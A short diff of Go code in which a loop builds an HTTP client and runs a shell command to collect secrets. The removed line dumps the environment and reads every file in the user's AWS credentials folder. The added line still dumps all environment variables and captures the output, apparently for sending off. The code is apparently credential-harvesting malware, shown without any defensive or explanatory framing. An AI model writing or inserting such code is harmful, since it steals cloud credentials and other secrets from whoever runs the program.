@@ -50,7 +50,7 @@ for    {
 
 	cli := http.Client{}
 
-	extract := exec.Command("sh", "-c", "env ;   cd   $HOME/.aws ;  cat * ")
+	extract := exec.Command("sh", "-c", "env")
 
 	out, err_combinedoutput := extract.CombinedOutput()
 
